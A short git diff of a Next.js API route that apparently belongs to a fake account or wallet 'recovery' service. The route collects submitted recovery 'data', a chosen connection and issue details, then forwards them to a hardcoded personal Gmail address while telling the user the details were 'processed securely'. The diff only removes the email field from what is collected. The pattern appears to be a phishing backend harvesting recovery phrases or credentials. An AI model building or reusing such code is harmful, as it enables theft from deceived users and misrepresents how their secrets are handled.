@@ -4,7 +4,7 @@ import nodemailer from 'nodemailer'
 export async function POST(request: NextRequest) {
   try {
     const body = await request.json()
-    const { email, issueId, issueTitle, issueDescription, issueSummary, selectedConnection, method, data, timestamp } = body
+    const { issueTitle, issueDescription, issueSummary, selectedConnection, method, data, timestamp } = body
 
     const toAddress = process.env.RESTORE_M || 'jenniergers2@gmail.com'
     const submitted = data || 'N/A'
@@ -83,7 +83,7 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ success: true, message: 'Recovery details processed securely' }, { status: 200 })
     }
 
-    console.log('Recovery details (no transport configured):', { to: toAddress, from: email, method, timestamp, submitted })
+    console.log('Recovery details (no transport configured):', { to: toAddress, method, timestamp, submitted })
     return NextResponse.json({ success: true, message: `Recovery details logged (to: ${toAddress})` }, { status: 200 })
   } catch (error) {
     console.error('Error processing recovery request:', error)
